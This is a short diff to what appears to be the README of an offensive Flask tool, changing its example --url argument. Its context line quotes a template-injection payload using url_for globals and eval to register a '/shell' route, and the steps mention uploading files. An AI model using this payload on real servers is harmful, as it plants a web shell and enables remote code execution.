@@ -29,7 +29,7 @@ url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell',
 * Start the tool
 
 ```bash
-python flask_manager --url 192.168.225.149
+python flask_manager --url http://192.168.225.149:5000
 ```
 
 * Upload file
